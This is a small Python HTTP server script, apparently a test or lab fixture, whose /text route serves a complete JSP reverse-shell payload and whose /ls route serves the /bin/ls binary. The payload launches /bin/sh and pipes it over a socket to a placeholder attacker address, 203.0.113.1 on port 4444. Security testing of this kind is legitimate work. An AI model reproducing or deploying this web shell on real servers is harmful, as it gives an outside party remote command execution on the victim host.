#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/text':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'''<%@ page import="java.net.*, java.io.*" %>
                               <%
                                   String host="203.0.113.1";
                                   int port=4444;
                                   String cmd="/bin/sh";
                                   out.println("Starting reverse shell!");
                                   Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
                                   Socket s=new Socket(host,port);
                                   InputStream pi=p.getInputStream(),
                                   pe=p.getErrorStream(),
                                   si=s.getInputStream();
                                   OutputStream po=p.getOutputStream(),so=s.getOutputStream();
                                   while(!s.isClosed()) {
                                      while(pi.available()>0)
                                         so.write(pi.read());
                                      while(pe.available()>0)
                                         so.write(pe.read());
                                      while(si.available()>0)
                                         po.write(si.read());
                                      so.flush();
                                      po.flush();
                                      Thread.sleep(50);
                                      try {
                                         p.exitValue();
                                         break;
                                      }
                                      catch (Exception e){
                                      }
                                   };
                                   p.destroy();
                                   s.close();
                               %>
                            ''')
        elif self.path == '/ls':
            try:
                with open('/bin/ls', 'rb') as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Length', str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('localhost', 8081), Handler)
    print("Server running on http://localhost:8081")
    server.serve_forever()
